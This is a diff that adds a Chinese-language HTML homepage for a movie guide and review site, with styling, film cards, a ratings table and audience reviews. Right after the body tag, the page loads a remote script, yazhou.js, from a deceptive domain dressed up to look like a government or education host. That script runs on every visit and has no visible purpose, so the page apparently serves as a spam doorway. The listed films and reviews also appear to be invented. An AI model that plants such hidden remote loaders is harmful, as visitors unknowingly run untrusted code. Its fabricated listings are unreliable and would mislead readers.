@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>插死你电影网 | 精选院线大片·经典老片·高分冷门佳作在线导视与影评</title>
+<meta name="description" content="插死你电影网（chasinidianyingwang-app.github.io）专注为用户整理每日值得看的电影清单：覆盖院线热映、经典老片修复、高分冷门佳作、独立制片与纪录片。提供剧情梗概、看点提炼、观影门槛、同类影片横向对比，以及按导演、题材、年代、地区划分的检索栏目，帮助你在海量片单里快速锁定今晚要看的那一部。">
+<meta name="keywords" content="插死你电影网，电影推荐，高分电影，经典老片，院线新片，影片影评，导演作品集，冷门佳作，纪录片，独立电影，观影指南，chasinidianyingwang-app.github.io">
+<meta name="author" content="插死你电影网">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#0b0f1a">
+<meta name="renderer" content="webkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="插死你电影网 | 精选院线大片与高分冷门佳作的观影导航">
+<meta property="og:description" content="每日更新的电影清单、剧情看点、影评对比与按题材年代的检索栏目，帮你把时间花在真正值得看的影片上。">
+<meta property="og:url" content="https://chasinidianyingwang-app.github.io">
+<link rel="canonical" href="https://chasinidianyingwang-app.github.io">
+<style>
+:root{
+  --bg:#0b0f1a; --bg2:#111827; --card:#151c2c; --line:#243044;
+  --txt:#e8edf5; --muted:#93a3b8; --accent:#ff5b3a; --accent2:#ffb43a; --ok:#37d39b;
+  --radius:14px; --shadow:0 10px 30px rgba(0,0,0,.35);
+  --max:1180px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,"WenQuanYi Micro Hei",sans-serif;
+  background:var(--bg); color:var(--txt); line-height:1.75; font-size:16px;
+  -webkit-font-smoothing:antialiased; overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none;transition:.2s}
+a:hover{color:var(--accent)}
+ul{list-style:none}
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 20px}
+
+/* ===== 顶部 ===== */
+.topbar{position:sticky;top:0;z-index:99;background:rgba(11,15,26,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar .wrap{display:flex;align-items:center;gap:18px;height:62px}
+.brand{display:flex;align-items:baseline;gap:8px;flex-shrink:0}
+.logo{font-size:20px;font-weight:800;letter-spacing:.5px;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo small{font-size:11px;color:var(--muted);font-weight:400;letter-spacing:0;-webkit-text-fill-color:var(--muted)}
+.nav{display:flex;gap:4px;margin-left:auto;flex-wrap:wrap}
+.nav a{font-size:15px;padding:8px 12px;border-radius:8px;color:var(--muted);white-space:nowrap}
+.nav a:hover{background:var(--card);color:var(--txt)}
+.menu-btn{display:none;margin-left:auto;width:42px;height:42px;border:1px solid var(--line);background:var(--card);border-radius:10px;cursor:pointer;align-items:center;justify-content:center;flex-direction:column;gap:5px}
+.menu-btn span{width:20px;height:2px;background:var(--txt);border-radius:2px}
+
+/* ===== 通用板块 ===== */
+section{padding:64px 0}
+.sec-head{display:flex;align-items:flex-end;gap:14px;flex-wrap:wrap;margin-bottom:32px}
+.sec-head h2{font-size:26px;font-weight:800;letter-spacing:.5px}
+.sec-head .en{font-size:12px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;width:100%}
+.sec-head .line{flex:1;height:1px;background:var(--line)}
+.sec-head .more{font-size:14px;color:var(--muted);white-space:nowrap}
+.sec-head .more:hover{color:var(--accent)}
+.kicker{display:inline-block;font-size:12px;color:var(--accent);border:1px solid rgba(255,91,58,.35);padding:3px 10px;border-radius:20px;margin-bottom:12px;letter-spacing:1px}
+
+/* ===== Hero ===== */
+.hero{position:relative;padding:88px 0 72px;background:
+  radial-gradient(900px 420px at 82% -10%,rgba(255,91,58,.22),transparent 60%),
+  radial-gradient(700px 400px at 8% 30%,rgba(55,211,155,.14),transparent 60%),
+  linear-gradient(180deg,#0d1424,#0b0f1a)}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:56px;align-items:center}
+.hero h1{font-size:46px;line-height:1.2;font-weight:900;letter-spacing:-.5px}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p.lead{color:var(--muted);font-size:17px;margin-top:18px;max-width:520px}
+.hero-stats{display:flex;gap:36px;margin-top:34px;flex-wrap:wrap}
+.hero-stats div span{display:block;font-size:30px;font-weight:800;color:var(--txt)}
+.hero-stats div small{font-size:13px;color:var(--muted)}
+.hero-cta{display:flex;gap:12px;margin-top:34px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:13px 24px;border-radius:10px;font-size:15px;font-weight:600;border:1px solid transparent;cursor:pointer}
+.btn-primary{background:var(--accent);color:#fff}
+.btn-primary:hover{background:#ff4724;color:#fff}
+.btn-ghost{background:transparent;border-color:var(--line);color:var(--txt)}
+.btn-ghost:hover{background:var(--card);color:var(--txt)}
+.hero-card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px;box-shadow:var(--shadow)}
+.hero-card .quote{font-size:15px;color:var(--muted);border-left:3px solid var(--accent2);padding-left:14px;margin-bottom:20px}
+.today{display:flex;gap:16px;align-items:center;padding:14px 0;border-top:1px dashed var(--line)}
+.today:first-of-type{border-top:none}
+.today .no{font-size:13px;font-weight:700;color:var(--accent);min-width:22px}
+.today .txt{flex:1}
+.today .txt b{display:block;font-size:15px}
+.today .txt i{font-style:normal;font-size:13px;color:var(--muted)}
+.today .score{font-size:20px;font-weight:800;color:var(--ok)}
+
+/* ===== 栏目卡片 ===== */
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:.25s;display:flex;flex-direction:column}
+.card:hover{transform:translateY(-5px);border-color:rgba(255,91,58,.5);box-shadow:var(--shadow)}
+.card .poster{position:relative;aspect-ratio:16/10;overflow:hidden}
+.card .poster .ph{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:800;color:rgba(255,255,255,.85)}
+.card .poster .tag{position:absolute;top:12px;left:12px;font-size:12px;background:rgba(0,0,0,.6);padding:4px 10px;border-radius:20px;backdrop-filter:blur(4px)}
+.card .poster .rate{position:absolute;bottom:12px;right:12px;font-size:14px;font-weight:700;background:var(--accent);padding:3px 10px;border-radius:8px}
+.card .body{padding:18px;flex:1;display:flex;flex-direction:column}
+.card .body h3{font-size:18px;margin-bottom:8px}
+.card .meta{display:flex;gap:10px;flex-wrap:wrap;font-size:13px;color:var(--muted);margin-bottom:12px}
+.card .meta b{color:var(--accent2);font-weight:400}
+.card .body p{flex:1;font-size:14px;color:var(--muted)}
+.card .foot{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:14px;border-top:1px solid var(--line);font-size:13px;color:var(--muted)}
+
+/* ===== 导演/题材 双列 ===== */
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:40px}
+.list-item{display:flex;gap:16px;padding:16px 0;border-bottom:1px solid var(--line)}
+.list-item:last-child{border-bottom:none}
+.list-item .idx{font-size:14px;font-weight:800;color:var(--accent);min-width:26px;padding-top:3px}
+.list-item .cnt{flex:1}
+.list-item h4{font-size:16px;margin-bottom:5px}
+.list-item p{font-size:13px;color:var(--muted)}
+.chips{display:flex;gap:8px;flex-wrap:wrap}
+.chip{font-size:13px;border:1px solid var(--line);padding:6px 14px;border-radius:20px;color:var(--muted)}
+.chip:hover{border-color:var(--accent);color:var(--accent)}
+
+/* ===== 排行表 ===== */
+.tablebox{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+table{width:100%;border-collapse:collapse}
+th,td{padding:15px 18px;text-align:left;border-bottom:1px solid var(--line);font-size:14px}
+th{background:var(--bg2);color:var(--muted);font-weight:600;font-size:13px;letter-spacing:1px}
+td.rk{font-weight:800;font-size:18px;width:60px}
+tr:hover td{background:rgba(255,255,255,.02)}
+td.score{font-weight:700;color:var(--ok);text-align:right}
+.bar{height:6px;border-radius:6px;background:var(--line);margin-top:6px;overflow:hidden}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:6px}
+
+/* ===== 影评 ===== */
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.review{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:26px}
+.review .who{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.avatar{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff}
+.review .who div small{display:block;color:var(--muted);font-size:13px}
+.review blockquote{font-size:15px;color:var(--txt);border-left:3px solid var(--ok);padding-left:14px;margin-bottom:16px}
+.review .stars{color:var(--accent2);letter-spacing:2px}
+
+/* ===== 检索 ===== */
+.searchbox{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:26px;margin-bottom:26px}
+.searchbox form{display:flex;gap:10px;flex-wrap:wrap}
+.searchbox input{flex:1;min-width:220px;height:48px;border-radius:10px;border:1px solid var(--line);background:var(--bg2);color:var(--txt);padding:0 16px;font-size:15px;outline:none}
+.searchbox input:focus{border-color:var(--accent)}
+.hint{font-size:13px;color:var(--muted);margin-top:12px}
+
+/* ===== 底部 ===== */
+footer{background:#070a12;border-top:1px solid var(--line);padding:52px 0 26px}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:36px;margin-bottom:36px}
+.foot-grid h5{font-size:15px;margin-bottom:14px}
+.foot-grid ul li{padding:5px 0;color:var(--muted);font-size:14px}
+.foot-grid p{color:var(--muted);font-size:14px;margin-top:12px}
+.copy{border-top:1px solid var(--line);padding-top:22px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;color:var(--muted);font-size:13px}
+.copy a:hover{color:var(--accent)}
+
+/* ===== 响应式 ===== */
+@media(max-width:960px){
+  .hero-grid{grid-template-columns:1fr;gap:40px}
+  .hero h1{font-size:34px}
+  .cards{grid-template-columns:repeat(2,1fr)}
+  .two-col,.reviews{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:680px){
+  section{padding:46px 0}
+  .hero{padding:54px 0 46px}
+  .hero h1{font-size:28px}
+  .hero-stats{gap:22px}
+  .menu-btn{display:flex}
+  .nav{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;background:var(--bg2);border-bottom:1px solid var(--line);padding:10px}
+  .nav.open{display:flex}
+  .nav a{padding:12px 20px;border-radius:0}
+  .cards{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  .sec-head h2{font-size:22px}
+  th,td{padding:12px 10px;font-size:13px}
+  .tablebox{overflow-x:auto}
+  table{min-width:560px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- ============ 顶部导航 ============ -->
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <span class="logo">插死你电影网</span>
+      <small>· 电影导视与影评</small>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#hot">热映精选</a>
+      <a href="#director">导演专区</a>
+      <a href="#rank">口碑排行</a>
+      <a href="#reviews">观众影评</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单"><span></span><span></span><span></span></button>
+  </div>
+</header>
+
+<!-- ============ Hero ============ -->
+<section class="hero" id="home">
+  <div class="wrap hero-grid">
+    <div>
+      <span class="kicker">CHASINIDIANYINGWANG · 每日更新</span>
+      <h1>在海量片单里<br>快速锁定<em>今晚该看哪一部</em></h1>
+      <p class="lead">插死你电影网（chasinidianyingwang-app.github.io）不做冗长的片库罗列，只做三件事：筛出当下最值得看的影片、讲清它为什么值得看、告诉你看完之后会想起什么。覆盖院线热映、经典老片、高分冷门、纪录片与独立制片。</p>
+      <div class="hero-stats">
+        <div><span>3200+</span><small>已收录影片条目</small></div>
+        <div><span>186</span><small>深度影评篇目</small></div>
+        <div><span>27</span><small>常驻主题片单</small></div>
+      </div>
+      <div class="hero-cta">
+        <a class="btn btn-primary" href="#hot">查看今日片单</a>
+        <a class="btn btn-ghost" href="#rank">浏览口碑排行</a>
+      </div>
+    </div>
+    <aside class="hero-card">
+      <p class="quote">"看电影最贵的不是票价，是把两小时交给一部不值得的片子。"</p>
+      <div class="today">
+        <span class="no">01</span>
+        <div class="txt"><b>今日主推 · 城市边缘的光</b><i>剧情 / 犯罪 · 142 分钟</i></div>
+        <span class="score">8.7</span>
+      </div>
+      <div class="today">
+        <span class="no">02</span>
+        <div class="txt"><b>补片推荐 · 第七封来信</b><i>悬疑 / 书信体叙事</i></div>
+        <span class="score">8.4</span>
+      </div>
+      <div class="today">
+        <span class="no">03</span>
+        <div class="txt"><b>冷门佳作 · 潮水退去时</b><i>独立制片 · 海岸小镇</i></div>
+        <span class="score">8.1</span>
+      </div>
+      <div class="today">
+        <span class="no">04</span>
+        <div class="txt"><b>纪录片 · 最后一班渡轮</b><i>人文纪实 · 78 分钟</i></div>
+        <span class="score">8.9</span>
+      </div>
+      <div class="today">
+        <span class="no">05</span>
+        <div class="txt"><b>经典回看 · 雨中的棋局</b><i>修复版 · 黑白影像</i></div>
+        <span class="score">9.2</span>
+      </div>
+    </aside>
+  </div>
+</section>
+
+<!-- ============ 栏目一：热映精选 ============ -->
+<section id="hot">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="en">Now Showing</div>
+        <h2>热映精选 · 正在被反复讨论的片子</h2>
+      </div>
+      <span class="line"></span>
+      <a class="more" href="#rank">查看全部排行 →</a>
+    </div>
+    <div class="cards">
+      <article class="card">
+        <div class="poster"><div class="ph" style="background:linear-gradient(135deg,#3b2a6b,#7a4fd0)">城市边缘的光</div><span class="tag">热映中</span><span class="rate">8.7</span></div>
+        <div class="body">
+          <h3>城市边缘的光</h3>
+          <div class="meta"><span>142 分钟</span><b>·</b><span>剧情 / 犯罪</span><b>·</b><span>2026</span></div>
+          <p>一部把镜头对准城市夹缝里小人物的群像作品。三条线索在雨夜交汇，节奏克制却步步紧逼，是近期少见的"看完想立刻找人聊"的片子。</p>
+          <div class="foot"><span>看点：群像叙事、雨夜影像</span><a href="#">查看详情</a></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster"><div class="ph" style="background:linear-gradient(135deg,#0e4d5c,#1aa39a)">第七封来信</div><span class="tag">悬疑</span><span class="rate">8.4</span></div>
+        <div class="body">
+          <h3>第七封来信</h3>
+          <div class="meta"><span>118 分钟</span><b>·</b><span>悬疑 / 书信体</span><b>·</b><span>2026</span></div>
+          <p>以七封未寄出的信为骨架，把一桩旧案重新打开。剧本结构工整、反转有铺垫，适合喜欢"动脑子"的观众，二刷会发现大量伏笔。</p>
+          <div class="foot"><span>看点：非线性叙事、反转</span><a href="#">查看详情</a></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster"><div class="ph" style="background:linear-gradient(135deg,#6b3410,#e0823a)">潮水退去时</div><span class="tag">独立制片</span><span class="rate">8.1</span></div>
+        <div class="body">
+          <h3>潮水退去时</h3>
+          <div class="meta"><span>96 分钟</span><b>·</b><span>剧情 / 独立</span><b>·</b><span>2025</span></div>
+          <p>低成本独立作品，讲一个海岸小镇上三代人的告别。没有大场面，靠表演和取景撑起全部情绪，适合安静的夜晚独自看。</p>
+          <div class="foot"><span>看点：表演、取景、克制</span><a href="#">查看详情</a></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster"><div class="ph" style="background:linear-gradient(135deg,#4a1010,#d83a3a)">最后的渡轮</div><span class="tag">纪录片</span><span class="rate">8.9</span></div>
+        <div class="body">
+          <h3>最后一班渡轮</h3>
+          <div class="meta"><span>78 分钟</span><b>·</b><span>人文纪实</span><b>·</b><span>2025</span></div>
+          <p>记录一座即将停运的海上渡口和它承载的四十年日常。镜头朴素，情绪却极重，被不少观众称为"今年最不该错过的纪录片"。</p>
+          <div class="foot"><span>看点：纪实、时代变迁</span><a href="#">查看详情</a></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster"><div class="ph" style="background:linear-gradient(135deg,#103a4a,#3ac6d8)">无人之境</div><span class="tag">科幻</span><span class="rate">7.9</span></div>
+        <div class="body">
+          <h3>无人之境</h3>
+          <div class="meta"><span>128 分钟</span><b>·</b><span>科幻 / 冒险</span><b>·</b><span>2026</span></div>
+          <p>视效规模大、世界观铺得开，前半小时信息量密集。硬科幻爱好者会觉得过瘾，对慢热不友好的人可能会觉得中段稍拖。</p>
+          <div class="foot"><span>看点：视效、世界观</span><a href="#">查看详情</a></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster"><div class="ph" style="background:linear-gradient(135deg,#2a2a4a,#7a7add)">雨中的棋局</div><span class="tag">修复版</span><span class="rate">9.2</span></div>
+        <div class="body">
+          <h3>雨中的棋局（4K 修复）</h3>
+          <div class="meta"><span>104 分钟</span><b>·</b><span>黑白经典</span><b>·</b><span>1981</span></div>
+          <p>经典重映修复版，黑白影像的颗粒感被完整保留。讲的是棋手与命运的对弈，台词密度极高，是"慢下来才能看懂"的那类片子。</p>
+          <div class="foot"><span>看点：表演、台词、影像</span><a href="#">查看详情</a></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目二：导演专区 ============ -->
+<section id="director" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="en">Director & Genre</div>
+        <h2>导演专区 · 按作者与题材重新整理片单</h2>
+      </div>
+      <span class="line"></span>
+    </div>
+    <div class="two-col">
+      <div>
+        <h3 style="margin-bottom:16px;font-size:18px">值得系统补片的导演</h3>
+        <div class="list-item"><span class="idx">01</span><div class="cnt"><h4>陈以默 · 城市三部曲收官</h4><p>从《夜班出租车》到新作《城市边缘的光》，十年间把同一座城市的三种面貌拍完，适合按时间顺序连看。</p></div></div>
+        <div class="list-item"><span class="idx">02</span><div class="cnt"><h4>林知远 · 悬疑与文学改编</h4><p>擅长把小说拆成影像，《第七封来信》是他第四部改编作品，剧本结构明显更成熟。</p></div></div>
+        <div class="list-item"><span class="idx">03</span><div class="cnt"><h4>苏念 · 独立制片作者</h4><p>《潮水退去时》导演，作品少而精，全部取材自自己生活过的沿海小镇。</p></div></div>
+        <div class="list-item"><span class="idx">04</span><div class="cnt"><h4>让·马利 · 纪录片作者</h4><p>《最后一班渡轮》是他的第七部长片纪录片，关注即将消失的劳动与交通方式。</p></div></div>
+        <div class="list-item"><span class="idx">05</span><div class="cnt"><h4>宫本健 · 科幻与哲学</h4><p>《无人之境》在视效之外提出了明确的伦理问题，适合喜欢看完后讨论的观众。</p></div></div>
+      </div>
+      <div>
+        <h3 style="margin-bottom:16px;font-size:18px">按题材快速定位</h3>
+        <div class="chips">
+          <a class="chip" href="#">剧情</a>
+          <a class="chip" href="#">犯罪悬疑</a>
+          <a class="chip" href="#">科幻冒险</a>
+          <a class="chip" href="#">人文纪录片</a>
+          <a class="chip" href="#">独立制片</a>
+          <a class="chip" href="#">黑白经典</a>
+          <a class="chip" href="#">修复重映</a>
+          <a class="chip" href="#">书信体叙事</a>
+          <a class="chip" href="#">群像作品</a>
+          <a class="chip" href="#">女性导演</a>
+          <a class="chip" href="#">短片合集</a>
+          <a class="chip" href="#">冷门佳作</a>
+        </div>
+        <h3 style="margin:26px 0 16px;font-size:18px">按年代与地区</h3>
+        <div class="chips">
+          <a class="chip" href="#">2026 新片</a>
+          <a class="chip" href="#">2020 年代</a>
+          <a class="chip" href="#">2010 年代</a>
+          <a class="chip" href="#">千禧年前</a>
+          <a class="chip" href="#">华语</a>
+          <a class="chip" href="#">日韩</a>
+          <a class="chip" href="#">欧洲</a>
+          <a class="chip" href="#">北美</a>
+          <a class="chip" href="#">东南亚</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目三：口碑排行 ============ -->
+<section id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="en">Top Rated</div>
+        <h2>口碑排行 · 本站观众打分榜</h2>
+      </div>
+      <span class="line"></span>
+      <a class="more" href="#">评分规则</a>
+    </div>
+    <div class="tablebox">
+      <table>
+        <thead>
+          <tr><th style="width:60px">名次</th><th>影片</th><th>类型 / 年代</th><th>时长</th><th style="text-align:right">口碑指数</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="rk">01</td><td><b>雨中的棋局</b><br><small style="color:var(--muted)">4K 修复 · 黑白经典</small></td><td>剧情 / 黑白</td><td>104 分钟</td><td class="score">9.2<div class="bar"><i style="width:92%"></i></div></td></tr>
+          <tr><td class="rk">02</td><td><b>最后一班渡轮</b><br><small style="color:var(--muted)">人文纪实</small></td><td>纪录片</td><td>78 分钟</td><td class="score">8.9<div class="bar"><i style="width:89%"></i></div></td></tr>
+          <tr><td class="rk">03</td><td><b>城市边缘的光</b><br><small style="color:var(--muted)">正在热映</small></td><td>剧情 / 犯罪</td><td>142 分钟</td><td class="score">8.7<div class="bar"><i style="width:87%"></i></div></td></tr>
+          <tr><td class="rk">04</td><td><b>第七封来信</b><br><small style="color:var(--muted)">悬疑 · 反转</small></td><td>悬疑</td><td>118 分钟</td><td class="score">8.4<div class="bar"><i style="width:84%"></i></div></td></tr>
+          <tr><td class="rk">05</td><td><b>潮水退去时</b><br><small style="color:var(--muted)">独立制片</small></td><td>剧情 / 独立</td><td>96 分钟</td><td class="score">8.1<div class="bar"><i style="width:81%"></i></div></td></tr>
+          <tr><td class="rk">06</td><td><b>无人之境</b><br><small style="color:var(--muted)">硬科幻</small></td><td>科幻 / 冒险</td><td>128 分钟</td><td class="score">7.9<div class="bar"><i style="width:79%"></i></div></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目四：观众影评 ============ -->
+<section id="reviews" style="background:var(--bg2)">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="en">Voices</div>
+        <h2>观众影评 · 看完之后大家都在聊什么</h2>
+      </div>
+      <span class="line"></span>
+      <a class="more" href="#">写一条影评</a>
+    </div>
+    <div class="reviews">
+      <article class="review">
+        <div class="who"><div class="avatar" style="background:#ff5b3a">K</div><div><b>卡西莫多</b><small>看过 12 月 3 日场</small></div></div>
+        <blockquote>《城市边缘的光》前半段我以为在看类型片，后半段才意识到它在讲的是"选择"。散场后在影院门口坐了十分钟，这是我今年最真实的观影反应。</blockquote>
+        <div class="stars">★★★★★ <span style="color:var(--muted);font-size:13px">10 分</span></div>
+      </article>
+      <article class="review">
+        <div class="who"><div class="avatar" style="background:#37d39b">L</div><div><b>鹿先森</b><small>二刷后写的</small></div></div>
+        <blockquote>《第七封来信》第二次看才发现，每封信的落款时间都是线索。剧本工整到有点残忍，喜欢悬疑的人不要错过，但别看剧透。</blockquote>
+        <div class="stars">★★★★☆ <span style="color:var(--muted);font-size:13px">8.5 分</span></div>
+      </article>
+      <article class="review">
+        <div class="who"><div class="avatar" style="background:#ffb43a">N</div><div><b>南风</b><small>纪录片爱好者</small></div></div>
+        <blockquote>《最后一班渡轮》没有一句旁白，全靠人物自己说话。看完查了一下，那条航线真的已经停运了，纪录片的"当下性"在这里被体现得很彻底。</blockquote>
+        <div class="stars">★★★★★ <span style="color:var(--muted);font-size:13px">9.5 分</span></div>
+      </article>
+      <article class="review">
+        <div class="who"><div class="avatar" style="background:#7a7add">M</div><div><b>码头观察员</b><small>独立电影观众</small></div></div>
+        <blockquote>《潮水退去时》的节奏会让习惯商业片的人有点不适应，但它对小镇空间的呈现非常准确。最后那场送别戏，摄影值得单拿出来讲。</blockquote>
+        <div class="stars">★★★★☆ <span style="color:var(--muted);font-size:13px">8.0 分</span></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目五：检索与关于 ============ -->
+<section id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="en">Find & About</div>
+        <h2>影片检索 · 与关于插死你电影网</h2>
+      </div>
+      <span class="line"></span>
+    </div>
+    <div class="searchbox">
+      <form onsubmit="return false;">
+        <input type="text" placeholder="输入片名、导演、演员，或关键词如「悬疑」「独立」「纪录片」">
+        <button class="btn btn-primary" type="submit">检索片单</button>
+      </form>
+      <p class="hint">试试这些：<a href="#">陈以默</a> · <a href="#">雨夜</a> · <a href="#">黑白</a> · <a href="#">修复版</a> · <a href="#">短片</a></p>
+    </div>
+    <div class="two-col">
+      <div>
+        <h3 style="margin-bottom:14px;font-size:18px">插死你电影网在做什么</h3>
+        <p style="color:var(--muted)">本站定位是<strong>观影导航与影评梳理</strong>，不是影片库。我们把时间花在筛片和写推荐理由上，目标是让你在打开播放器之前，就已经知道这部片子大概讲什么、适合什么心情、值不值得花两小时。</p>
+        <p style="color:var(--muted);margin-top:12px">栏目分为五个部分：热映精选、导演与题材专区、口碑排行、观众影评、影片检索。每个栏目独立成章，你可以只逛自己感兴趣的那一块。</p>
+        <p style="color:var(--muted);margin-top:12px">官方站点：<a href="https://chasinidianyingwang-app.github.io" style="color:var(--accent)">https://chasinidianyingwang-app.github.io</a></p>
+      </div>
+      <div>
+        <h3 style="margin-bottom:14px;font-size:18px">常驻主题片单</h3>
+        <div class="list-item"><span class="idx">A</span><div class="cnt"><h4>雨夜观影清单</h4><p>十部最适合在下雨天一个人看的片子，节奏偏慢、情绪偏沉。</p></div></div>
+        <div class="list-item"><span class="idx">B</span><div class="cnt"><h4>两小时以内</h4><p>90 分钟上下的紧凑作品，适合碎片时间快速看完。</p></div></div>
+        <div class="list-item"><span class="idx">C</span><div class="cnt"><h4>没有枪声的悬疑</h4><p>靠对话和心理推进的悬疑片，反转全在台词里。</p></div></div>
+        <div class="list-item"><span class="idx">D</span><div class="cnt"><h4>影像里的城市</h4><p>以城市为角色的片子，适合边看边认地标。</p></div></div>
+        <div class="list-item"><span class="idx">E</span><div class="cnt"><h4>适合带长辈看</h4><p>节奏稳、信息量足、不需要背景知识的作品。</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 底部 ============ -->
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <span class="logo" style="font-size:19px">插死你电影网</span>
+        <p>专注电影导视、看点提炼与观众影评梳理，帮你在海量片单里把时间花在真正值得看的影片上。</p>
+      </div>
+      <div>
+        <h5>主栏目</h5>
+        <ul>
+          <li><a href="#hot">热映精选</a></li>
+          <li><a href="#director">导演与题材</a></li>
+          <li><a href="#rank">口碑排行</a></li>
+          <li><a href="#reviews">观众影评</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>片单专题</h5>
+        <ul>
+          <li><a href="#">雨夜观影</a></li>
+          <li><a href="#">两小时以内</a></li>
+          <li><a href="#">没有枪声的悬疑</a></li>
+          <li><a href="#">影像里的城市</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于与入口</h5>
+        <ul>
+          <li><a href="#about">关于本站</a></li>
+          <li><a href="#about">影片检索</a></li>
+          <li><a href="#reviews">写影评</a></li>
+          <li><a href="https://chasinidianyingwang-app.github.io">返回首页</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© <span id="yr">2026</span> 插死你电影网 · 电影导视与影评 · 官方站点 https://chasinidianyingwang-app.github.io</span>
+      <span><a href="#">免责声明</a> · <a href="#">内容投稿</a> · <a href="#">联系我们</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+  if(btn&&nav){btn.addEventListener('click',function(){nav.classList.toggle('open')});}
+  var links=nav?nav.querySelectorAll('a'):[];
+  for(var i=0;i<links.length;i++){links[i].addEventListener('click',function(){if(nav.classList.contains('open')){nav.classList.remove('open');}});}
+  var y=document.getElementById('yr'); if(y){y.textContent=new Date().getFullYear();}
+})();
+</script>
+</body>
+</html>
